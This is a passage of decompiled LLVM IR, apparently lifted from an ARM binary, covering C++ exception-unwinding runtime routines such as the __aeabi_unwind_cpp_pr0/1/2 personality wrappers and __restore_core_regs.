dec_label_pc_1a88c:                               ; preds = %dec_label_pc_1a7c0, %dec_label_pc_1a884, %dec_label_pc_1a998, %dec_label_pc_1a7cc
  %v0_1a890 = phi i32 [ %v1_1a7d0, %dec_label_pc_1a7cc ], [ %storemerge, %dec_label_pc_1a884 ], [ %v1_1a99c, %dec_label_pc_1a998 ], [ %v0_1a7cc.pre, %dec_label_pc_1a7c0 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_1a7cc ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a884 ], [ %v1_1a998, %dec_label_pc_1a998 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a7c0 ]
  %v0_1a88c = load i32, i32* @sl, align 4
  %v3_1a88c = mul i32 %v0_1a88c, 4
  %v2_1a890 = add i32 %v3_1a88c, %v0_1a890
  %v1_1a5b865 = inttoptr i32 %v2_1a890 to i32*
  %v2_1a5b866 = load i32, i32* %v1_1a5b865, align 4
  %v2_1a5bc68 = icmp eq i32 %v2_1a5b866, 0
  br i1 %v2_1a5bc68, label %dec_label_pc_1a678, label %dec_label_pc_1a5c4.preheader.lr.ph

dec_label_pc_1a898:                               ; preds = %dec_label_pc_1a718
  %v0_1a8a8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a8a8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1a8b0 = load i32, i32* @r8, align 4
  %v1_1a8b0 = add i32 %v0_1a8b0, 32
  %v2_1a8b0 = inttoptr i32 %v1_1a8b0 to i32*
  %v3_1a8b0 = load i32, i32* %v2_1a8b0, align 4
  store i32 %v3_1a8b0, i32* @r4, align 4
  %v5_1a8b4 = call i32 @_Unwind_VRS_Get(i32 %v0_1a8a8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a8b4, i32* %r0.global-to-local, align 4
  %v3_1a8b8 = load i32, i32* %stack_var_-48, align 4
  %v0_1a8bc = load i32, i32* @r4, align 4
  %v9_1a8bc = icmp eq i32 %v0_1a8bc, %v3_1a8b8
  br i1 %v9_1a8bc, label %dec_label_pc_1a964, label %dec_label_pc_1a898.dec_label_pc_1a8c4_crit_edge

dec_label_pc_1a898.dec_label_pc_1a8c4_crit_edge:  ; preds = %dec_label_pc_1a898
  %v0_1a8c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a8c4

dec_label_pc_1a8c4:                               ; preds = %dec_label_pc_1a898.dec_label_pc_1a8c4_crit_edge, %dec_label_pc_1a964
  %v0_1a8c4 = phi i32 [ %v0_1a8c4.pre, %dec_label_pc_1a898.dec_label_pc_1a8c4_crit_edge ], [ %v1_1a968, %dec_label_pc_1a964 ]
  %v1_1a8c4 = inttoptr i32 %v0_1a8c4 to i32*
  %v2_1a8c4 = load i32, i32* %v1_1a8c4, align 4
  %v4_1a8c4 = add i32 %v0_1a8c4, 4
  store i32 %v4_1a8c4, i32* @r7, align 4
  br label %dec_label_pc_1a884

dec_label_pc_1a8d0:                               ; preds = %dec_label_pc_1a7d8
  %v0_1a8e0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a8e0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1a8e8 = load i32, i32* @r8, align 4
  %v1_1a8e8 = add i32 %v0_1a8e8, 32
  %v2_1a8e8 = inttoptr i32 %v1_1a8e8 to i32*
  %v3_1a8e8 = load i32, i32* %v2_1a8e8, align 4
  store i32 %v3_1a8e8, i32* @r4, align 4
  %v5_1a8ec = call i32 @_Unwind_VRS_Get(i32 %v0_1a8e0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a8ec, i32* %r0.global-to-local, align 4
  %v3_1a8f0 = load i32, i32* %stack_var_-48, align 4
  %v0_1a8f4 = load i32, i32* @r4, align 4
  %v9_1a8f4 = icmp eq i32 %v0_1a8f4, %v3_1a8f0
  br i1 %v9_1a8f4, label %dec_label_pc_1a8fc, label %dec_label_pc_1a850

dec_label_pc_1a8fc:                               ; preds = %dec_label_pc_1a8d0
  %v0_1a8fc = load i32, i32* @r8, align 4
  %v1_1a8fc = add i32 %v0_1a8fc, 40
  %v2_1a8fc = inttoptr i32 %v1_1a8fc to i32*
  %v3_1a8fc = load i32, i32* %v2_1a8fc, align 4
  %v1_1a900 = load i32, i32* @r7, align 4
  %v9_1a900 = icmp eq i32 %v3_1a8fc, %v1_1a900
  br i1 %v9_1a900, label %dec_label_pc_1a908, label %dec_label_pc_1a850

dec_label_pc_1a908:                               ; preds = %dec_label_pc_1a8fc
  %v1_1a908 = inttoptr i32 %v3_1a8fc to i32*
  %v2_1a908 = load i32, i32* %v1_1a908, align 4
  %v1_1a90c = and i32 %v2_1a908, 1073741824
  %v2_1a90c = icmp eq i32 %v1_1a90c, 0
  br i1 %v2_1a90c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_1a908
  %v2_1a910 = or i32 %v2_1a908, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_1a908
  %tmp208 = bitcast i32 %v2_1a908 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_1a914 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_1a918 = phi i32 [ %v2_1aa48, %.thread28 ], [ %v2_1aa48, %bb169 ], [ %v3_1a8fc, %bb165 ], [ %v3_1a8fc, %.thread26 ]
  %v0_1a918 = phi i32 [ %v2_1aa58, %.thread28 ], [ %v2_1aa54, %bb169 ], [ %v2_1a910, %bb165 ], [ %v2_1a914, %.thread26 ]
  %v2_1a918 = add i32 %v0_1a918, %v1_1a918
  store i32 %v2_1a918, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a930 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a930, i32* %r0.global-to-local, align 4
  %v5_1a938 = call i32 @_Unwind_VRS_Set(i32 %v0_1a930, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_1a930, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a950 = load i32, i32* @r8, align 4
  store i32 %v0_1a950, i32* %stack_var_-48, align 4
  %v5_1a958 = call i32 @_Unwind_VRS_Set(i32 %v0_1a930, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a70c

dec_label_pc_1a964:                               ; preds = %dec_label_pc_1a898
  %v0_1a964 = load i32, i32* @r8, align 4
  %v1_1a964 = add i32 %v0_1a964, 40
  %v2_1a964 = inttoptr i32 %v1_1a964 to i32*
  %v3_1a964 = load i32, i32* %v2_1a964, align 4
  %v1_1a968 = load i32, i32* @r7, align 4
  %v9_1a968 = icmp eq i32 %v3_1a964, %v1_1a968
  br i1 %v9_1a968, label %dec_label_pc_1a970, label %dec_label_pc_1a8c4

dec_label_pc_1a970:                               ; preds = %dec_label_pc_1a964
  %v1_1a974 = add i32 %v3_1a964, 4
  store i32 %v1_1a974, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1a97c = add i32 %v0_1a964, 44
  %v3_1a97c = inttoptr i32 %v2_1a97c to i32*
  store i32 0, i32* %v3_1a97c, align 4
  %v0_1a980 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a980 = load i32, i32* @r8, align 4
  %v2_1a980 = add i32 %v1_1a980, 48
  %v3_1a980 = inttoptr i32 %v2_1a980 to i32*
  store i32 %v0_1a980, i32* %v3_1a980, align 4
  %v0_1a984 = load i32, i32* @sl, align 4
  %v1_1a984 = load i32, i32* @r8, align 4
  %v2_1a984 = add i32 %v1_1a984, 40
  %v3_1a984 = inttoptr i32 %v2_1a984 to i32*
  store i32 %v0_1a984, i32* %v3_1a984, align 4
  %v0_1a988 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a988 = load i32, i32* @r8, align 4
  %v2_1a988 = add i32 %v1_1a988, 52
  %v3_1a988 = inttoptr i32 %v2_1a988 to i32*
  store i32 %v0_1a988, i32* %v3_1a988, align 4
  %v0_1a98c = load i32, i32* @r7, align 4
  %v1_1a98c = inttoptr i32 %v0_1a98c to i32*
  %v2_1a98c = load i32, i32* %v1_1a98c, align 4
  %v1_1a990 = icmp slt i32 %v2_1a98c, 0
  br i1 %v1_1a990, label %dec_label_pc_1a998, label %dec_label_pc_1aa44

dec_label_pc_1a998:                               ; preds = %dec_label_pc_1a970
  %v0_1a998 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a998 = add i32 %v0_1a998, -3
  store i32 %v1_1a998, i32* %r2.global-to-local, align 4
  %v0_1a99c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a99c = add i32 %v0_1a99c, 4
  store i32 %v1_1a99c, i32* @r6, align 4
  br label %dec_label_pc_1a88c

dec_label_pc_1a9a8:                               ; preds = %dec_label_pc_1a7b8, %dec_label_pc_1a844, %dec_label_pc_1a770, %dec_label_pc_1a744.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1a9b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a9b8, i32* %r0.global-to-local, align 4
  %v5_1a9c0 = call i32 @_Unwind_VRS_Get(i32 %v0_1a9b8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1a9c4 = load i32, i32* @r7, align 4
  %v1_1a9c4 = load i32, i32* @r8, align 4
  %v2_1a9c4 = add i32 %v1_1a9c4, 40
  %v3_1a9c4 = inttoptr i32 %v2_1a9c4 to i32*
  store i32 %v0_1a9c4, i32* %v3_1a9c4, align 4
  %v3_1a9c8 = load i32, i32* %stack_var_-48, align 4
  %v3_1a9cc = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1a9cc, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_1a9d4 = load i32, i32* @r8, align 4
  %v2_1a9d4 = add i32 %v1_1a9d4, 32
  %v3_1a9d4 = inttoptr i32 %v2_1a9d4 to i32*
  store i32 %v3_1a9c8, i32* %v3_1a9d4, align 4
  %v0_1a9d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a9d8 = load i32, i32* @r8, align 4
  %v2_1a9d8 = add i32 %v1_1a9d8, 36
  %v3_1a9d8 = inttoptr i32 %v2_1a9d8 to i32*
  store i32 %v0_1a9d8, i32* %v3_1a9d8, align 4
  %v1_1a714.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a70c

dec_label_pc_1a9e0:                               ; preds = %bb155
  %v1_1a9e0 = inttoptr i32 %v0_1a668 to i32*
  %v2_1a9e0 = load i32, i32* %v1_1a9e0, align 4
  %v1_1a9e4 = add i32 %v0_1a668, 4
  %v1_1a9e8 = and i32 %v2_1a9e0, 1073741824
  %v2_1a9e8 = icmp eq i32 %v1_1a9e8, 0
  %v2_1a9ec = or i32 %v2_1a9e0, -2147483648
  %tmp210 = bitcast i32 %v2_1a9e0 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_1a9f0 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_1a9e8, i32 %v2_1a9f0, i32 %v2_1a9ec
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_1a9f4 = load i32, i32* @r8, align 4
  %v2_1a9f4 = add i32 %v1_1a9f4, 56
  %v3_1a9f4 = inttoptr i32 %v2_1a9f4 to i32*
  store i32 %v1_1a9e4, i32* %v3_1a9f4, align 4
  %v0_1a9f8 = load i32, i32* @r8, align 4
  store i32 %v0_1a9f8, i32* %r0.global-to-local, align 4
  %v4_1aa04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 28) to i32*), align 4
  store i32 109072, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1aa04)
  %v0_1aa10 = load i32, i32* %r0.global-to-local, align 4
  %v2_1aa10 = icmp eq i32 %v0_1aa10, 0
  br i1 %v2_1aa10, label %dec_label_pc_1a708, label %dec_label_pc_1aa18

dec_label_pc_1aa18:                               ; preds = %dec_label_pc_1a9e0
  %v0_1aa18 = load i32, i32* %r4.global-to-local, align 4
  %v1_1aa18 = load i32, i32* @r7, align 4
  %v2_1aa18 = add i32 %v1_1aa18, %v0_1aa18
  store i32 %v2_1aa18, i32* %stack_var_-48, align 4
  %v0_1aa28 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1aa28, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_1aa38 = call i32 @_Unwind_VRS_Set(i32 %v0_1aa28, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a70c

dec_label_pc_1aa44:                               ; preds = %dec_label_pc_1a970
  %v0_1aa44 = load i32, i32* @sl, align 4
  %v3_1aa44 = mul i32 %v0_1aa44, 4
  %v0_1aa48 = load i32, i32* %r0.global-to-local, align 4
  %v2_1aa48 = add i32 %v0_1aa48, %v3_1aa44
  %v3_1aa48 = inttoptr i32 %v2_1aa48 to i32*
  %v4_1aa48 = load i32, i32* %v3_1aa48, align 4
  %v1_1aa4c = and i32 %v4_1aa48, 1073741824
  %v2_1aa4c = icmp eq i32 %v1_1aa4c, 0
  br i1 %v2_1aa4c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_1aa44
  %v2_1aa54 = or i32 %v4_1aa48, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_1aa44
  %tmp212 = bitcast i32 %v4_1aa48 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_1aa58 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_1aa48, { 2, 1, 0 }
  uselistorder i32 %v1_1a99c, { 1, 0 }
  uselistorder i32 %v1_1a998, { 1, 0 }
  uselistorder i32 %v1_1a968, { 1, 0 }
  uselistorder i32 %v0_1a930, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1a8fc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a8c4, { 1, 0 }
  uselistorder i32 %v0_1a8c4, { 1, 0 }
  uselistorder i32 %v2_1a5b866, { 1, 0 }
  uselistorder i32 %v2_1a890, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_1a5b8, { 1, 0 }
  uselistorder i32 %v1_1a850, { 1, 0 }
  uselistorder i32 %v3_1a7ec, { 2, 0, 1 }
  uselistorder i32 %v0_1a7cc, { 1, 0 }
  uselistorder i32 %v0_1a7cc.pre, { 1, 0 }
  uselistorder i32 %v1_1a724, { 1, 0 }
  uselistorder i32 %v2_1a71c, { 1, 0 }
  uselistorder i32 %v0_1a6ac, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_1a66c, { 1, 0 }
  uselistorder i32 %v1_1a668, { 1, 0 }
  uselistorder i32 %v0_1a668, { 1, 0, 2 }
  uselistorder i32 %v4_1a640, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1a7e4, { 1, 2, 0 }
  uselistorder i32 %v0_1a618, { 1, 0 }
  uselistorder i32 %v3_1a614, { 1, 0, 2 }
  uselistorder i32 %v1_1a5e8, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_1a820, { 1, 0 }
  uselistorder i1 %v2_1a654, { 1, 0, 2 }
  uselistorder i32 %v1_1a558, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 70, 0, 14, 15, 69, 16, 29, 30, 17, 28, 3, 31, 18, 32, 1, 19, 20, 21, 5, 22, 33, 34, 35, 6, 36, 37, 38, 39, 7, 40, 41, 42, 43, 8, 44, 9, 45, 46, 23, 47, 10, 48, 49, 50, 24, 51, 11, 52, 53, 25, 54, 55, 56, 57, 58, 26, 59, 12, 60, 61, 62, 63, 64, 65, 27, 66, 13, 67, 4, 68, 2 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 29, 1, 2, 4, 17, 18, 14, 15, 16, 19, 21, 20, 5, 24, 25, 3, 26, 0, 27, 28, 6, 7, 22, 23, 8, 11, 9, 12, 10, 13 }
  uselistorder i32 48, { 22, 2, 0, 8, 6, 7, 12, 13, 9, 10, 16, 17, 18, 14, 19, 3, 11, 15, 1, 4, 20, 5, 21 }
  uselistorder i32 44, { 46, 3, 47, 48, 0, 16, 4, 17, 5, 6, 7, 27, 28, 29, 30, 31, 32, 24, 25, 26, 8, 22, 23, 9, 1, 10, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 11, 12, 13, 18, 19, 20, 21, 14, 43, 2, 44, 15, 45 }
  uselistorder i32 -2147483648, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32 1073741824, { 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 144, 147, 143, 148, 28, 29, 30, 31, 32, 33, 34, 35, 36, 142, 37, 38, 39, 2, 40, 0, 3, 41, 42, 44, 43, 1, 47, 45, 46, 48, 54, 49, 55, 50, 56, 51, 52, 53, 58, 59, 60, 61, 57, 141, 63, 62, 65, 64, 67, 68, 69, 66, 70, 72, 73, 74, 71, 75, 76, 78, 79, 77, 80, 145, 81, 84, 82, 85, 83, 87, 88, 89, 86, 90, 95, 91, 96, 92, 97, 93, 94, 99, 100, 101, 98, 102, 146, 103, 104, 105, 107, 106, 108, 116, 109, 117, 110, 118, 111, 119, 112, 120, 113, 114, 115, 122, 123, 124, 125, 121, 126, 131, 127, 132, 128, 129, 130, 134, 136, 137, 138, 133, 135, 140, 139 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_24424.765 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 15, 27, 68, 86, 69, 87, 16, 17, 70, 71, 72, 88, 18, 89, 90, 91, 19, 92, 20, 73, 93, 94, 21, 22, 23, 95, 74, 96, 24, 97, 25, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 104, 105, 34, 33, 35, 106, 107, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 108, 5, 109, 110, 111, 112, 113, 32, 76, 114, 81 }
  uselistorder i32 -2, { 0, 33, 34, 6, 3, 4, 2, 7, 8, 9, 1, 5, 29, 28, 30, 31, 32, 21, 22, 23, 24, 25, 26, 27, 10, 11, 12, 13, 14, 20, 19, 18, 17, 16, 15 }
  uselistorder i32 80, { 15, 16, 17, 1, 3, 2, 4, 5, 6, 12, 7, 8, 11, 9, 10, 13, 0, 14 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a9a8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1a8c4, { 1, 0 }
  uselistorder label %dec_label_pc_1a88c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1a850, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_1a7cc, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_1a70c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_1a708, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1a668, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_1a5c4, { 1, 0 }
  uselistorder label %dec_label_pc_1a5c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1a5c4.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_1aa64(i32 %arg1) local_unnamed_addr {
dec_label_pc_1aa64:
  %v0_1aa64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1aa64, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1aa64
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1aa64, %bb
  %v10_1aa6c = phi i32 [ %arg1, %dec_label_pc_1aa64 ], [ 0, %bb ]
  ret i32 %v10_1aa6c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 27, 28, 29, 49, 19, 26, 50, 51, 52, 53, 54, 5, 4, 55, 42, 43, 30, 31, 20, 34, 33, 32, 35, 6, 8, 44, 21, 22, 7, 16, 9, 38, 17, 15, 18, 10, 11, 12, 36, 13, 14, 39, 45, 46, 47, 24, 48, 23, 25, 41, 37, 40, 56, 57 }
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 41, 15, 1, 16, 17, 37, 38, 39, 40, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1aa74 = load i32, i32* @r1, align 4
  %v2_1aa74 = load i32, i32* @r2, align 4
  %v4_1aa74 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_1aa74, i32 %v2_1aa74, i32 2)
  ret i32 %v4_1aa74
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1aa7c = load i32, i32* @r1, align 4
  %v2_1aa7c = load i32, i32* @r2, align 4
  %v4_1aa7c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_1aa7c, i32 %v2_1aa7c, i32 1)
  ret i32 %v4_1aa7c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1aa84 = load i32, i32* @r1, align 4
  %v2_1aa84 = load i32, i32* @r2, align 4
  %v4_1aa84 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_1aa84, i32 %v2_1aa84, i32 0)
  ret i32 %v4_1aa84

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 8, 9, 10, 55, 11, 0, 20, 12, 21, 56, 57, 58, 16, 17, 18, 19, 34, 35, 36, 37, 59, 60, 61, 72, 73, 74, 75, 64, 1, 65, 62, 63, 2, 3, 4, 42, 43, 5, 6, 66, 67, 68, 69, 70, 71, 38, 44, 45, 46, 22, 13, 14, 15, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 7, 39, 40, 41, 47, 48, 49, 50, 51, 52, 53, 54 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1aa8c = add i32 %tmp, 56
  %v4_1aa8c = inttoptr i32 %v3_1aa8c to i32*
  %v5_1aa8c = load i32, i32* %v4_1aa8c, align 4
  %v6_1aa8c = add i32 %tmp, 60
  %v7_1aa8c = inttoptr i32 %v6_1aa8c to i32*
  %v8_1aa8c = load i32, i32* %v7_1aa8c, align 4
  %v2_1aa98 = load i32, i32* %arg1, align 4
  %v3_1aa98 = add i32 %tmp, 4
  %v4_1aa98 = inttoptr i32 %v3_1aa98 to i32*
  %v5_1aa98 = load i32, i32* %v4_1aa98, align 4
  store i32 %v5_1aa98, i32* @r1, align 4
  %v12_1aa98 = add i32 %tmp, 16
  %v13_1aa98 = inttoptr i32 %v12_1aa98 to i32*
  %v14_1aa98 = load i32, i32* %v13_1aa98, align 4
  store i32 %v14_1aa98, i32* @r4, align 4
  %v15_1aa98 = add i32 %tmp, 20
  %v16_1aa98 = inttoptr i32 %v15_1aa98 to i32*
  %v17_1aa98 = load i32, i32* %v16_1aa98, align 4
  store i32 %v17_1aa98, i32* @r5, align 4
  %v18_1aa98 = add i32 %tmp, 24
  %v19_1aa98 = inttoptr i32 %v18_1aa98 to i32*
  %v20_1aa98 = load i32, i32* %v19_1aa98, align 4
  store i32 %v20_1aa98, i32* @r6, align 4
  %v21_1aa98 = add i32 %tmp, 28
  %v22_1aa98 = inttoptr i32 %v21_1aa98 to i32*
  %v23_1aa98 = load i32, i32* %v22_1aa98, align 4
  store i32 %v23_1aa98, i32* @r7, align 4
  %v24_1aa98 = add i32 %tmp, 32
  %v25_1aa98 = inttoptr i32 %v24_1aa98 to i32*
  %v26_1aa98 = load i32, i32* %v25_1aa98, align 4
  store i32 %v26_1aa98, i32* @r8, align 4
  %v27_1aa98 = add i32 %tmp, 36
  %v28_1aa98 = inttoptr i32 %v27_1aa98 to i32*
  %v29_1aa98 = load i32, i32* %v28_1aa98, align 4
  store i32 %v29_1aa98, i32* @sb, align 4
  %v30_1aa98 = add i32 %tmp, 40
  %v31_1aa98 = inttoptr i32 %v30_1aa98 to i32*
  %v32_1aa98 = load i32, i32* %v31_1aa98, align 4
  store i32 %v32_1aa98, i32* @sl, align 4
  store i32 %v8_1aa8c, i32* @ip, align 4
  store i32 %v5_1aa8c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_1aa8c)
  ret i32 %v2_1aa98

; uselistorder directives
  uselistorder i32 %v8_1aa8c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 61, 62, 63, 64, 13, 14, 6, 7, 1, 67, 8, 65, 66, 11, 12, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 2, 101, 102, 103, 104, 105, 106, 107, 108, 109, 9, 110, 111, 112, 23, 24, 3, 19, 20, 21, 22, 25, 26, 27, 28, 29, 10, 18, 30, 31, 32, 33, 0, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 4, 15, 16, 17, 52, 53, 54, 55, 56, 57, 58, 5, 59, 60 }
  uselistorder i32 40, { 30, 26, 27, 28, 29, 11, 31, 2, 12, 4, 5, 1, 6, 3, 13, 14, 7, 15, 16, 17, 18, 19, 20, 22, 21, 0, 8, 23, 9, 24, 10, 25 }
  uselistorder i32* @sb, { 116, 117, 118, 3, 4, 5, 6, 92, 93, 94, 95, 96, 97, 98, 99, 104, 107, 105, 106, 108, 2, 81, 82, 66, 67, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 24, 25, 20, 21, 22, 23, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 1, 57, 58, 59, 60, 61, 62, 63, 64, 65, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 83, 84, 85, 86, 87, 88, 89, 90, 91, 100, 101, 102, 103, 109, 110, 111, 112, 113, 114, 115 }
  uselistorder i32 36, { 21, 20, 4, 22, 6, 7, 5, 14, 16, 8, 15, 9, 0, 1, 2, 3, 10, 11, 17, 12, 18, 13, 19 }
